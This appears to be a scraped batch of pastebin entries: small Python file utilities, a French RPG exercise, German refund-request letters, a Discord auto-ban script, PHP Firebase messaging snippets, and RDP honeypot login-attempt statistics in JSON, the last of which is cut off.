jS6YJhn0,remove_blank_lines,Python253,Python,Friday 1st of March 2024 07:16:12 PM CDT,"#!/usr/bin/env python3
# Filename: remove_blank_lines.py
# Author: Jeoi Reqi
# This script removes blank lines from a text file, preserving unique lines in sorted order & saves to file.

import os

# Function to remove blank lines from text
def remove_blank_lines(input_file, output_file):
    with open(input_file, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    non_blank_lines = [line for line in lines if line.strip() != '']
    # Write Data To File
    with open(output_file, 'w', encoding='utf-8') as output:  # Use utf-8 Encoding
        output.writelines(non_blank_lines)

if __name__ == ""__main__"":
    current_directory = os.getcwd()
    input_file_path = os.path.join(current_directory, 'input.txt')   # Replace with the actual input file name
    output_file_path = os.path.join(current_directory, 'output.txt')   # Replace with the desired output file name

    remove_blank_lines(input_file_path, output_file_path)  # Remove the blank lines

    print(""Blank lines removed."")   # Terminal Output

"
1RK9b0NG,Exercice de Raclette,AdminArchon,Python,Friday 1st of March 2024 07:13:27 PM CDT,"from pathlib import Path
from random import randint, choice

current_directory = Path(__file__).parent
chemin_nom = current_directory / ""nom.txt""
chemin_comportement = current_directory / ""comportement.txt""


######################### FONCTION POUR CREER LES FICHIERS TXT DE RACLETTE
def creation_fichier_pour_raclette():
    if not chemin_nom.is_file():  # ou chemin_nom.touch(exist_ok = True)
        chemin_nom.touch()
        liste_nom = [""Raclette Froide"", ""Amakiir"", ""Amastacia"", ""Galanodel"", ""Holimion"", ""Ilphelkiir"", ""Liadon"",
                     ""Melianne"", ""Nailo"", ""Siannodel"", ""Xiloscient"", ""Basha"", ""Dumein"", ""Jassan"", ""Khalid"", ""Mostana"",
                     ""Pashar"", ""Rein"", ""Amblecrown"", ""Buckman"", ""Dundragon"", ""Evenwood"", ""Greycastle"", ""Tallstag"",
                     ""Bersk"", ""Chernin"", ""Dotsk"", ""Kulenov"", ""Marsk""]
        with open(chemin_nom, 'w') as f:
            for element in liste_nom:
                f.write(element + '\n')
    if not chemin_comportement.is_file():
        chemin_comportement.touch()
        liste_comportement = [""vous devisage"", ""serre le manche de son epee"", ""se cure les dents avec sa lame"",
                              ""tape du pied"", ""regarde son reflet dans sa lame"", ""crache dans sa main"", ""se recoiffe"",
                              ""grogne"", ""se racle la gorge"", ""siffle pour attirer votre attention"", ""mord son collier"",
                              ""prend un air intimidant"", ""glisse sa botte dans une flaque"",
                              ""jette un caillou a vos pieds"", ""detourne le regard"", ""regarde un oiseau qui passe"",
                              ""se gratte"", ""ajuste son armure"", ""essaie de compter avec ses doigts""]
        with open(chemin_comportement, 'w') as f:
            for element in liste_comportement:
                f.write(element + '\n')


creation_fichier_pour_raclette()  # A SUPPRIMER APRES LE PREMIER RUN


###########################################################################

                            # BUG ou MALFACON
# BUG constate : chaine vide prenom ennemi parfois....comment supprimer la derniere ligne vierge du document txt
# MAUVAIS agencement constate : clarté d'un lancer de sort pas clair car index de liste, a revoir




##########################################################################

CHOIX_MENU = [""1"",""2"",""3""]
CHOIX_MENU_DETAILS = [""Attaquer"",""Lancer un sort"",""Boire un café""]

class De:
    def __init__(self, nb_faces):
        self.nb_faces = nb_faces

    def lancer_de(self) -> int:
        de = randint(1, self.nb_faces)
        return de

class Sort:
    def __init__(self, nom, attributs):
        self.nom = nom
        self.cooldown = 0
        self.attributs = attributs
        self.sort_parti = True
        self.CA_de_base = 0

    def lancer(self, lanceur, cible):

        if self.cooldown > 0:
            print(f""Reste {self.cooldown} tour avant de pouvoir le lancer\n"")

        if self.cooldown <= 0:

            if self.attributs == ""heal"":
                print(lanceur.nom, ""se regenere de "", lanceur.intelligence, ""pv"")           # HEAL
                lanceur.pv += lanceur.de_perso.lancer_de() + lanceur.intelligence
                self.cooldown = 3
                # print(f""{lanceur.nom} a {lanceur.pv} pv"")

            elif self.attributs == ""damage"":
                degats = lanceur.de_perso.lancer_de() + lanceur.force
                print(lanceur.nom, ""lance un sort de "", self.nom, ""et inflige "", degats, "" pts"")  # DAMAGE : Mains Brulantes
                cible.prendre_degats(degats)
                self.cooldown = 3

            else:
                print(lanceur.nom, ""lance un sort de "", self.nom)
                self.CA_de_base = lanceur.classe_d_armure
                lanceur.classe_d_armure += 10                           # donne une protection temporaire
                print(f""{lanceur.classe_d_armure} de Classe d'Armure"")
                self.sort_parti = True
                self.cooldown = 3

            if self.sort_parti and self.cooldown <= 0:
                lanceur.classe_d_armure = self.CA_de_base           # remet a zero la protection
                self.sort_parti = False


class Personnage:
    def __init__(self, nom, listes_stats, dexterite=15):
        self.nom = nom
        self.force = listes_stats[0]
        self.intelligence = listes_stats[2]
        self.dexterite = dexterite
        self.classe_d_armure = listes_stats[1]
        self.pv = 100
        self.xp = 100
        self.niveau = 1
        self.de_perso = De(20)
        self.en_vie = True
        self.rival = []
        self.sorts_connus = [Sort(""Soin"", ""heal"")]

    def upgrade(self):
        if self.xp >= 200:
            self.niveau += 1
            self.passer_un_niveau()
            self.xp = 0
            print(self.nom, ""passe au niveau "", self.niveau)

    def passer_un_niveau(self):
        if self.niveau == 2:
            self.sorts_connus.append(Sort(""Mains"", ""damage""))
            print(""\nVous Obtenez le sort Mains Brulantes et 20 de force en plus\n"")
            self.force += 20
        if self.niveau == 3:
            self.sorts_connus.append(Sort(""Protection"", ""shield""))
            print(""\nVous Obtenez le sort Protection et 30 de force en plus\n"")
            self.force += 30
        if self.niveau == 4:
            self.force += 40


    def attaquer(self, cible):
        """"""Si dexterite de l'attaquant superieur a la classe d'armure de l'attaqué :
        degats de force dans pv cible""""""
        touche = False
        self.dexterite = self.de_perso.lancer_de()
        devenir_hostile(self, cible)
        devenir_hostile(cible, self)

        if self.dexterite + 5 > cible.classe_d_armure:
            cible.prendre_degats(self.force)
            touche = True
        if self.pv > 0:
            print(
                f""{self.nom} ({self.pv} pv) attaque {cible.nom} de {self.force} pts : {""Touche"" if touche else ""Loupe""}""
            )

    def prendre_degats(self, degats):
        self.pv -= degats
        if self.pv <= 0:
            self.en_vie = False

    # def soin(self):
    #     """"""Si santé inferieur a 20 pv :
    #     heal de soin""""""
    #     if self.cooldown_soin <= 0:
    #         print(self.nom, ""se heal + "", self.intelligence, ""pv"")
    #         self.pv += self.intelligence
    #         self.cooldown_soin = 3
    #     else:
    #         print(f""Reste {self.cooldown_soin} tour avant de pouvoir le lancer"")
    #     # print(f""{self.nom} a {self.pv} pv"")
    #
    # def lancer_mains_brulantes(self):
    #     if self.cooldown_soin <= 0:
    #         print(self.nom, ""se heal + "", self.intelligence, ""pv"")
    #         self.pv += self.intelligence
    #         self.cooldown_soin = 3
    #     else:
    #         print(f""Reste {self.cooldown_soin} tour avant de pouvoir le lancer"")
    #     # print(f""{self.nom} a {self.pv} pv"")



    # suppression de def mort() car self.en_vie est un bool qui permet d'éviter l'action d'un mob



def choisir_un_nom_perso() -> str:
    listenom = open(chemin_nom, 'r').read().split('\n')  # splitlines()
    return choice(listenom)  # :-1


def donner_stat_aleatoire():
    """"""
    Affecte 1 nb entre (min et max) a chaque categorie force, ca et intelligence
    """"""
    stats = [randint(1, 20), randint(1, 20), randint(1, 20)]
    # liste de       force ,      classe d'armure   et   intelligence
    return stats


def devenir_hostile(cible1, cible2):
    """"""
    cible 2 devient hostile pour cible 1
    :param cible1: de lui
    :param cible2: futur rival
    """"""
    if not cible2 in cible1.rival:
        cible1.rival.append(cible2)


def victoire(perso, ennemi, boucle_de_jeu):

    if not ennemi.en_vie:
        print(f""{ennemi.nom} est mort et {perso.nom} gagne le combat ! "")
        perso.xp += ennemi.xp
        print(f""{perso.nom} : {perso.xp} xp"")
    if not perso.en_vie:
        print(f""{perso.nom} est mort et {ennemi.nom} gagne le combat !"")
        ennemi.xp += perso.xp
        print(f""{ennemi.nom} : {ennemi.xp} xp"")
    else:
        if boucle_de_jeu >= 10:
            print(""Victoire Ecrasante !"")

def defile_menu(CHOIX_MENU,CHOIX_MENU_DETAILS):
    i=0
    for element in CHOIX_MENU:
        print(f""{element}. {CHOIX_MENU_DETAILS[i]}\n"")
        i+=1

def tour_perso(perso, ennemi):
    choix_user = """"
    while not choix_user in CHOIX_MENU:
        print()
        defile_menu(CHOIX_MENU,CHOIX_MENU_DETAILS)
        choix_user = input(""\n"")

    if choix_user == ""1"":
        perso.attaquer(ennemi)  # atk du perso dans ennemi

    elif choix_user == ""2"":
        liste_nb_sorts = []
        i = 1
        for sort in perso.sorts_connus:
            print(f""{i}. {sort.nom}\n"")
            liste_nb_sorts.append(str(i))
            i += 1
        choix_user_sort = """"
        while not choix_user_sort in liste_nb_sorts:             #range(min,len(perso.sorts_connus)):
            choix_user_sort = input()                                                                       #  affiche la liste jusqu'au choix
        choix_user_sort = int(choix_user_sort)
        perso.sorts_connus[choix_user_sort-1].lancer(perso, ennemi)


    else:
        print(""Ta cru que c'était le moment ?\n"")

def tour_i_a_ennemi(ennemi, perso):
    if ennemi.en_vie:
        if ennemi.pv < 20:
            if ennemi.pv < 10 and ennemi.sorts_connus[0].cooldown <= 0:
                ennemi.sorts_connus[0].lancer(ennemi, ennemi)
            else:
                if choice([""O"", ""N""]) == ""O"" and ennemi.sorts_connus[0].cooldown <= 0:
                    ennemi.sorts_connus[0].lancer(ennemi, ennemi)
                else:
                    print(f""{ennemi.nom} n'arrive pas a se soigner"")
        else:

            if not perso in ennemi.rival:  # si le joueur n'est pas un rival
                if choice([""devient hostile"", ""reste calme"", ""reste calme"", ""reste calme""]) == ""devient hostile"":  # 1/4
                    print(f""{ennemi.nom} vous attaque ! "")
                    devenir_hostile(ennemi, perso)
                else:
                    liste_comportement = open(chemin_comportement, 'r').read().split('\n')  # splitlines()
                    print(f""{ennemi.nom} {choice(liste_comportement)}"")  # sinon ronge son frein
            if perso in ennemi.rival:
                ennemi.attaquer(perso)  # si joueur est rival = l'ennemi l'attaque
    else:
        print(f""{ennemi.nom} agonise"")

def descendre_les_compteurs(liste_mob):
    for personnage in liste_mob:
        for sort in personnage.sorts_connus:
            sort.cooldown -= 1


jeu = True

if jeu:

    # 1 . Creation Perso
    print()

    perso = Personnage(input(""Bonjour, comment tu t'appelles ?\n""), donner_stat_aleatoire())

    # 2 . Phase de Jeu
    boucle_de_jeu = 0

    while boucle_de_jeu < 10:

        print(f""Tour {boucle_de_jeu + 1}"")

        ennemi = Personnage(choisir_un_nom_perso(), donner_stat_aleatoire())

        while ennemi.en_vie:  # tant que l'ennemi est en vie
            liste_mob = [perso, ennemi]

            perso.upgrade()  # test si niveau superieur atteint

            tour_perso(perso, ennemi)

            tour_i_a_ennemi(ennemi, perso)

            victoire(perso, ennemi, boucle_de_jeu)  # Tests des victoires pour affichage
            if not ennemi.en_vie:
                break
            if not perso.en_vie:
                break
            descendre_les_compteurs(liste_mob)

        if not perso.en_vie:
            break
        boucle_de_jeu += 1


# De
# Déplacer lancerDe dans la classe
#
# Personnage
# Paliers d'exp progressifs                                                     ------ >   GAIN DE SORT ET GAIN DE FORCE
# Faire en sorte de pouvoir définir les stats du perso au moment de sa création ------ >   donner_stat_aleatoire()
# Ajouter un cooldown pour le soin                                              ------ >   Cooldown pour chaque sort
# Ajouter prendre_degats ou perdre_vie (ou autre, libre choix sur les noms)     ------ >    perdre degats dans classe
# Ajouter la méthode mort                                                       ------ >    supprimer car encombrant
#
# Boucle de Jeu
# Faire en sorte de pouvoir jouer Robert (Faire des choix)                      ------ >    Robert CHOIX_MENU
# Faire jouer l'ordinateur et le rendre un peu plus intelligent                 ------ >    i_a_tour_ennemi
# Sait se soigner et attaquer                                                   ------ >    heal de soin amelioré
# Ne se soigne pas abusivement si beaucoup d'HP                                 ------ >    heal de soin si < 20 pv
# Essaye de survivre                                                            ------ >    heal de soin < 10 pv
# Régler la victoire                                                            ------ >    xp sur victoire et texte
#
# Code général
# Sortir les noms de perso du code (c'est moche et ça me fait chier :p)         ------ >    import fichier texte et nom
"
hTHnTetc,remove_duplicate_lines,Python253,Python,Friday 1st of March 2024 07:11:07 PM CDT,"#!/usr/bin/env python3
# Filename: remove_duplicate_lines.py
# Author: Jeoi Reqi
# This script removes duplicate lines from a text file, preserving unique lines in sorted order & saves to specified file.

def remove_duplicates(input_file, output_file):
    unique_lines = set()

    with open(input_file, 'r') as infile:
        for line in infile:
            unique_lines.add(line)

    with open(output_file, 'w') as outfile:
        outfile.writelines(sorted(unique_lines))

if __name__ == ""__main__"":
    input_file = ""geolocations.txt""  # Replace with the actual input file name
    output_file = ""output_without_duplicates.txt""  # Replace with the desired output file name
    remove_duplicates(input_file, output_file)  # Remove the duplicates

"
Z25H1TWQ,filter_lines,Python253,Python,Friday 1st of March 2024 07:07:03 PM CDT,"#!/usr/bin/env python3
# Filename: filter_lines.py
# Author: Jeoi Reqi
# This script reads lines from the input file, filters out lines starting with a custom filter & writes the remaining lines to the output file.

# Function to define the filter
def filter_lines(input_file, output_file):
    with open(input_file, 'r', encoding='utf-8') as infile, open(output_file, 'w', encoding='utf-8') as outfile:
        for line in infile:
            # Check if the line starts with ""渝ICP备""
            if not line.startswith(""渝ICP备""):  # Edit this to match your filter goals
                outfile.write(line)

# Replace 'input.txt' with the name of your input file and 'output.txt' with the desired output file name
input_file_name = 'input.txt'  # Replace 'input.txt' with the name of your input file 
output_file_name = 'output.txt'  # Replace 'output.txt' with the name of your output file 

filter_lines(input_file_name, output_file_name)

print(f""Filtered lines starting with '渝ICP备' from {input_file_name} and saved the result in {output_file_name}."")"
tEFTfv7s,split_data_w_markers,Python253,Python,Friday 1st of March 2024 06:57:06 PM CDT,"#!/usr/bin/env python3
# Filename: split_data_w_markers.py
# Author: Jeoi Reqi
# Split Data With Markers is a simple script to be used along with the Data Marker Python Script

import os

def split_file(input_file, output_directory, lines_per_chunk=100):
    with open(input_file, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    total_lines = len(lines)
    total_chunks = (total_lines // lines_per_chunk) + 1  # Adjust for the last chunk

    print(f""Total number of chunks: {total_chunks}"")

    # Calculate the number of digits needed for naming files
    num_digits = len(str(total_chunks))

    for i in range(total_chunks):
        start_index = i * lines_per_chunk
        end_index = min((i + 1) * lines_per_chunk, total_lines)

        chunk = lines[start_index:end_index]

        # Format the chunk number with leading zeros
        chunk_number = str(i + 1).zfill(num_digits)

        output_file_path = os.path.join(output_directory, f'chunk_{chunk_number}.txt')

        with open(output_file_path, 'w', encoding='utf-8') as output:
            output.writelines(chunk)

    print(""File split complete."")

if __name__ == ""__main__"":
    current_directory = os.getcwd()
    input_file_path = os.path.join(current_directory, 'isoon_chat.txt')   # Edit Input Name To Your Desired File Name
    output_directory_path = os.path.join(current_directory, 'split_isoon_chat_data_w_markers')  # Edit Output File Name To Your Desired File Name

    os.makedirs(output_directory_path, exist_ok=True)

    split_file(input_file_path, output_directory_path, lines_per_chunk=100)  # Split At The Markers


"
VyfFfZiN,data_marker,Python253,Python,Friday 1st of March 2024 06:55:59 PM CDT,"#!/usr/bin/env python3
# Filename: data_marker.py
# Author: Jeoi Reqi
# Data Marker is a simple script to be used along with the Split Data With Markers Python Script

import os

# Set Markers At Specified Number Of Lines (Eg;) 100 With Marker ""**"" 
def insert_marker(input_file, output_file, lines_per_marker=100, marker=""**""):
    with open(input_file, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    total_lines = len(lines)
    total_markers = total_lines // lines_per_marker

    print(f""Total number of markers: {total_markers}"")

    with open(output_file, 'w', encoding='utf-8') as output:
        for i in range(total_markers):
            start_index = i * lines_per_marker
            end_index = min((i + 1) * lines_per_marker, total_lines)

            chunk = lines[start_index:end_index]

            # Combine the lines into a single string
            combined_data = ''.join(chunk)

if __name__ == ""__main__"":
    current_directory = os.getcwd()
    input_file_path = os.path.join(current_directory, 'isoon_chat.txt')  # Edit Input To Your Desired File Name
    output_file_path = os.path.join(current_directory, 'output_isoon_chat_with_markers.txt')  # Edit Output File Name To Your Desired File Name

    insert_marker(input_file_path, output_file_path, lines_per_marker=100, marker=""**"")  # Insert The Markers

    print(""Script execution complete."")

"
HgJ9z07U,Untitled,TakePen,AutoIt,Friday 1st of March 2024 06:52:36 PM CDT,"Rechnungsnummer: 
Kaufdatum:

Sehr geehrtes Vollversion-Kaufen.de-Team,
 
ich wende mich nun auch per E-Mail an Sie, um eine Angelegenheit zu besprechen, die mir sehr am Herzen liegt.
 
Kürzlich habe ich bei Ihnen das Produkt ""Palworld für Steam"" auf Rechnung bestellt. Leider muss ich Ihnen mitteilen, dass ich meine Entscheidung überdenken musste, da sich meine persönlichen Umstände geändert haben.
 
Ich habe festgestellt, dass ich möglicherweise nicht in der Lage sein werde, das Produkt wie geplant zu nutzen (mein PC erfüllt nicht die Systemanforderungen), und möchte daher gerne von meinem Recht Gebrauch machen, vom Kaufvertrag zurückzutreten. Mir ist bewusst, dass die gesetzlichen Widerrufsfristen verstrichen sind und ich wäre Ihnen aufrichtig dankbar, wenn Sie mir in dieser Angelegenheit entgegenkommen könnten.
 
Bitte lassen Sie mich wissen, ob es möglich ist, den Kaufvertrag zu stornieren. Ich verstehe, dass dies bestimmte Prozesse erfordert und bin bereit, alle notwendigen Schritte zu unternehmen, um dies zu erleichtern.
 
Vielen Dank im Voraus für Ihre Aufmerksamkeit und Ihr Verständnis. Ich schätze Ihren exzellenten Kundenservice sehr und hoffe, dass wir gemeinsam eine zufriedenstellende Lösung finden können.
 

Mit freundlichen Grüßen,
KACKITOPI

"
mpvCdx3T,BDFD - Ban new account age,StaffVanish,Go,Friday 1st of March 2024 06:50:47 PM CDT,"Trigger: $onJoined[channelID]
Script Language: BDScript 2
Code:
$nomention
$var[day;30] $c[<= You can change the day of account age]
$var[reason;Account is to young] $c[<= Ban reason (optional)]



$c[Code to count account age]

$c[1. Change userID to timestamp]

$var[timestamp;$calculate[($authorID / 4194304 + 1420070400000) / 1000]]

$c[2. Change timestamp to time second now]

$var[second;$sub[$getTimestamp;$var[timestamp]]]

$c[3. Change second to day time]

$var[age;$calculate[$var[second] / 86400]]

$c[4. Check if account is less or equal to the specified account age]

$if[$var[age]<=$var[day]]

$c[5. Ban them]
$banID[$cropText[$var[reason];500;];$authorID]

$c[Add another code above here, if you want a ban dm message or log]

$c[Example:]

$if[$isUserDMEnabled[$authorID]==true]
$channelSendMessage[$dmChanelID[$authorID;Hi <@$authorID>, your account is to young, you have to wait **$sub[$var[day];$var[age]] Day** to join this server again]
$endif

$endif"
HHBnXpKv,Untitled,TakePen,AutoIt,Friday 1st of March 2024 06:45:37 PM CDT,"Sehr geehrtes Support-Team,

ich wende mich an Sie, um eine Angelegenheit zu besprechen, die mir sehr am Herzen liegt.

Kürzlich habe ich bei Ihnen das Produkt [Produktname] bestellt. Leider muss ich Ihnen mitteilen, dass ich meine Entscheidung überdenken musste, da sich meine persönlichen Umstände geändert haben.

Ich habe festgestellt, dass ich möglicherweise nicht in der Lage sein werde, das Produkt wie geplant zu nutzen, und möchte daher gerne von meinem Recht Gebrauch machen, vom Kaufvertrag zurückzutreten. Mir ist bewusst, dass die gesetzlichen Widerrufsfristen verstrichen sind und ich wäre Ihnen aufrichtig dankbar, wenn Sie mir in dieser Angelegenheit entgegenkommen könnten.

Bitte lassen Sie mich wissen, ob es möglich ist, den Kaufvertrag zu stornieren. Ich verstehe, dass dies bestimmte Prozesse erfordert und bin bereit, alle notwendigen Schritte zu unternehmen, um dies zu erleichtern.

Vielen Dank im Voraus für Ihre Aufmerksamkeit und Ihr Verständnis. Ich schätze Ihren exzellenten Kundenservice sehr und hoffe, dass wir gemeinsam eine zufriedenstellende Lösung finden können.

Mit freundlichen Grüßen,"
ZvaiPv47,Hand fcm,Zgragselus,PHP,Friday 1st of March 2024 06:34:49 PM CDT,"<?php
require_once __DIR__ . '/vendor/autoload.php';

use phpFCMv1\Client;
use phpFCMv1\Notification;
use phpFCMv1\Recipient;

$client = new Client('service_account.json');
$recipient = new Recipient();
$notification = new Notification();

$recipient -> setSingleRecipient('DEVICE_TOKEN');
$notification -> setNotification('NOTIFICATION_TITILE', 'NOTIFICATION_BODY');
$client -> build($recipient, $notification);
$client -> fire();
?>"
n8gzgWVZ,Copilot - fcm,Zgragselus,PHP,Friday 1st of March 2024 06:34:20 PM CDT,"<?php
require 'vendor/autoload.php';

use Google\Cloud\Core\ServiceBuilder;

// Authenticate with Google Cloud
$cloud = new ServiceBuilder([
    'keyFilePath' => 'path-to-your-service-account-json-file',
    'projectId' => 'your-project-id'
]);

// Get an instance of the Firebase Cloud Messaging client
$messaging = $cloud->messaging();

// Create a message
$message = [
    'notification' => [
        'title' => 'Notification title',
        'body' => 'Notification body'
    ],
    'android' => [
        'ttl' => '3600s',
        'priority' => 'normal',
        'notification' => [
            'icon' => 'stock_ticker_update',
            'color' => '#f45342'
        ]
    ],
    'token' => 'device-registration-token'
];

// Send the message
$response = $messaging->send($message);

echo $response;
?>"
BWtPW8pS,2024-03-01_stats.json,rdp_snitch,JSON,Friday 1st of March 2024 06:17:59 PM CDT,"{
  ""ip"": {
    ""103.143.207.200"": 2076,
    ""92.51.2.11"": 3,
    ""185.122.204.179"": 3,
    ""36.91.222.100"": 9,
    ""103.47.73.122"": 6,
    ""143.198.220.26"": 3,
    ""14.225.67.151"": 3,
    ""167.248.133.53"": 3,
    ""205.210.31.109"": 9,
    ""87.251.75.145"": 9,
    ""212.70.149.142"": 12,
    ""62.204.41.107"": 18,
    ""172.233.158.124"": 15,
    ""185.170.144.3"": 6,
    ""45.227.254.49"": 6,
    ""52.237.107.92"": 3,
    ""98.159.37.36"": 3,
    ""45.32.134.97"": 3,
    ""45.227.254.9"": 3,
    ""194.165.16.10"": 9,
    ""80.66.76.92"": 24,
    ""198.235.24.50"": 9,
    ""49.157.61.150"": 27,
    ""103.238.234.204"": 9,
    ""14.191.56.150"": 3,
    ""43.251.176.141"": 3,
    ""216.24.210.203"": 3,
    ""178.128.95.38"": 6,
    ""51.77.108.29"": 3,
    ""152.32.141.202"": 3,
    ""205.210.31.239"": 9,
    ""123.56.20.194"": 3,
    ""87.251.75.179"": 6,
    ""81.19.135.147"": 3,
    ""139.59.181.152"": 3,
    ""212.70.149.146"": 3,
    ""34.29.132.207"": 3,
    ""81.19.135.2"": 9,
    ""194.165.16.37"": 6,
    ""45.143.201.20"": 9,
    ""185.142.236.34"": 3,
    ""185.198.69.11"": 3,
    ""185.198.69.19"": 3,
    ""45.227.254.54"": 6,
    ""205.210.31.72"": 9,
    ""193.37.69.150"": 9,
    ""185.198.69.9"": 3,
    ""185.198.69.29"": 3,
    ""185.198.69.15"": 3,
    ""43.202.64.24"": 6,
    ""185.198.69.28"": 3,
    ""185.237.252.51"": 6,
    ""185.198.69.17"": 3,
    ""185.198.69.2"": 3
  },
  ""asn"": {
    ""AS18403"": 2076,
    ""AS209588"": 15,
    ""AS57523"": 27,
    ""AS7713"": 9,
    ""AS133676"": 6,
    ""AS14061"": 12,
    ""AS135905"": 3,
    ""AS398324"": 3,
    ""AS396982"": 39,
    ""AS208091"": 48,
    ""AS204428"": 15,
    ""AS59425"": 18,
    ""AS63949"": 15,
    ""AS197414"": 6,
    ""AS267784"": 15,
    ""AS8075"": 3,
    ""AS62240"": 6,
    ""AS20473"": 3,
    ""AS48721"": 15,
    ""AS9658"": 27,
    ""AS140810"": 9,
    ""AS45899"": 3,
    ""AS45804"": 3,
    ""AS16276"": 3,
    ""AS135377"": 3,
    ""AS37963"": 3,
    ""AS210950"": 9,
    ""AS174"": 3,
    ""AS16509"": 6,
    ""AS51167"": 6
  },
  ""isp"": {
    ""Vietnam Internet Network Information Center"": 2076,
    ""Flyservers S.A."": 45,
    ""Chang Way Technologies Co. Limited"": 27,
    ""PT Telekomunikasi Indonesia"": 9,
    ""Precious netcom pvt ltd"": 6,
    ""DigitalOcean, LLC"": 9,
    ""Vietnam Posts and Telecommunications Group"": 3,
    ""Censys, Inc."": 3,
    ""Google LLC"": 39,
    ""Xhost Internet Solutions LP"": 45,
    ""SS-Net"": 15,
    ""Horizon LLC"": 18,
    ""Akamai Technologies, Inc."": 15,
    ""Microsoft Corporation"": 3,
    ""LogicWeb Inc."": 3,
    ""Choopa"": 3,
    ""Eastern Telecommunications Philippines, Inc."": 27,
    ""MAYTINHVPSTTT"": 9,
    ""VNPT"": 3,
    ""Meghbela Cable & Broadband Services (P) Ltd"": 3,
    ""Clouvider Limited"": 3,
    ""OVH SAS"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Hangzhou Alibaba Advertising Co"": 3,
    ""DIGITALOCEAN"": 3,
    ""TOV E-RISHENNYA"": 9,
    ""Cogent Communications"": 3,
    ""Xhost Internet Solutions"": 9,
    ""Amazon.com, Inc."": 6,
    ""Contabo GmbH"": 6
  },
  ""org"": {
    ""Everest Global Joint Stock Company"": 2076,
    ""Alviva Holding Limited"": 15,
    ""Starcrecium Limited"": 3,
    ""Telekomunikasi Indonesia"": 9,
    ""Gstech Software Systems Pvt Ltd"": 6,
    ""DigitalOcean, LLC"": 6,
    ""VNPT"": 3,
    ""Censys, Inc."": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Xhost Internet Solutions"": 39,
    ""4Media Ltd"": 15,
    ""Horizon LLC"": 18,
    ""Akamai Technologies, Inc."": 15,
    ""Xhostis"": 6,
    ""UAB Host Baltic"": 15,
    ""Microsoft Azure Cloud (southeastasia)"": 3,
    ""Dedicated Servers"": 3,
    ""Vultr Holdings, LLC"": 3,
    ""Flyservers S.A"": 15,
    ""DSL Network"": 27,
    ""Vpsttt Computer Company Limited"": 9,
    ""Vietnam Posts and Telecommunications Group"": 3,
    ""Newmeghbelamcc"": 3,
    ""IPXO"": 3,
    ""Digitalocean"": 6,
    ""OVH Ltd"": 3,
    ""Ucloud Information Technology"": 3,
    ""Aliyun Computing Co., LTD"": 3,
    ""Google Cloud (us-central1)"": 3,
    ""TOV VAIZ PARTNER"": 9,
    ""BlackHOST Ltd."": 3,
    ""Chang Way Technologies Co. Limited"": 24,
    ""XHOSTIS"": 9,
    ""AWS EC2 (ap-northeast-2)"": 6,
    ""Contabo GmbH"": 6
  },
  ""regionName"": {
    ""Hanoi"": 2082,
    ""Hesse"": 15,
    ""Moscow"": 45,
    ""Jakarta"": 9,
    ""National Capital Territory of Delhi"": 6,
    ""South West"": 9,
    ""Michigan"": 3,
    ""California"": 60,
    ""North Holland"": 57,
    ""Plovdiv"": 15,
    ""Vilnius"": 15,
    ""Central Singapore"": 3,
    ""Kaunas"": 15,
    ""Metro Manila"": 27,
    ""Ho Chi Minh"": 9,
    ""West Bengal"": 3,
    ""England"": 6,
    ""Lagos"": 3,
    ""Beijing"": 3,
    ""Iowa"": 3,
    ""Kyiv City"": 9,
    ""Seoul"": 6,
    ""North Rhine-Westphalia"": 6
  },
  ""country"": {
    ""Vietnam"": 2091,
    ""Germany"": 21,
    ""Russia"": 45,
    ""Indonesia"": 9,
    ""India"": 9,
    ""Singapore"": 12,
    ""United States"": 66,
    ""The Netherlands"": 57,
    ""Bulgaria"": 15,
    ""Lithuania"": 30,
    ""Philippines"": 27,
    ""United Kingdom"": 6,
    ""Nigeria"": 3,
    ""China"": 3,
    ""Ukraine"": 9,
    ""South Korea"": 6
  },
  ""account"": {
    ""hello"": 2169,
    ""Administr"": 99,
    ""Test"": 48,
    ""(empty)"": 12,
    ""LmeVbFgnY"": 3,
    ""icpxLN"": 3,
    ""IaixQg"": 3,
    ""CnWsvacyx"": 3,
    ""danALU"": 3,
    ""ijAGne"": 3,
    ""Administrator"": 3,
    ""DwpNmDKwI"": 3,
    ""CLoyJg"": 3,
    ""RupRYB"": 3,
    ""Domain"": 39,
    ""root"": 3,
    ""JtieJUhiv"": 3,
    ""cWtxdC"": 3,
    ""ViSGoj"": 3
  },
  ""keyboard"": {
    ""Unknown"": 2409
  },
  ""client_build"": {
    ""Unknown"": 2409
  },
  ""client_name"": {
    ""Unknown"": 2409
  },
  ""ip_type"": {
    ""Unknown"": 2277,
    ""proxy"": 30,
    ""hosting & proxy"": 6,
    ""hosting"": 90,
    ""mobile"": 3,
    ""mobile & hosting"": 3
  }
}"
nQiHk6xz,2024-03-01_stats.json,rdp_snitch,JSON,Friday 1st of March 2024 06:16:06 PM CDT,"{
  ""ip"": {
    ""103.143.207.200"": 1384,
    ""92.51.2.11"": 2,
    ""185.122.204.179"": 2,
    ""36.91.222.100"": 6,
    ""103.47.73.122"": 4,
    ""143.198.220.26"": 2,
    ""14.225.67.151"": 2,
    ""167.248.133.53"": 2,
    ""205.210.31.109"": 6,
    ""87.251.75.145"": 6,
    ""212.70.149.142"": 8,
    ""62.204.41.107"": 12,
    ""172.233.158.124"": 10,
    ""185.170.144.3"": 4,
    ""45.227.254.49"": 4,
    ""52.237.107.92"": 2,
    ""98.159.37.36"": 2,
    ""45.32.134.97"": 2,
    ""45.227.254.9"": 2,
    ""194.165.16.10"": 6,
    ""80.66.76.92"": 16,
    ""198.235.24.50"": 6,
    ""49.157.61.150"": 18,
    ""103.238.234.204"": 6,
    ""14.191.56.150"": 2,
    ""43.251.176.141"": 2,
    ""216.24.210.203"": 2,
    ""178.128.95.38"": 4,
    ""51.77.108.29"": 2,
    ""152.32.141.202"": 2,
    ""205.210.31.239"": 6,
    ""123.56.20.194"": 2,
    ""87.251.75.179"": 4,
    ""81.19.135.147"": 2,
    ""139.59.181.152"": 2,
    ""212.70.149.146"": 2,
    ""34.29.132.207"": 2,
    ""81.19.135.2"": 6,
    ""194.165.16.37"": 4,
    ""45.143.201.20"": 6,
    ""185.142.236.34"": 2,
    ""185.198.69.11"": 2,
    ""185.198.69.19"": 2,
    ""45.227.254.54"": 4,
    ""205.210.31.72"": 6,
    ""193.37.69.150"": 6,
    ""185.198.69.9"": 2,
    ""185.198.69.29"": 2,
    ""185.198.69.15"": 2,
    ""43.202.64.24"": 4,
    ""185.198.69.28"": 2,
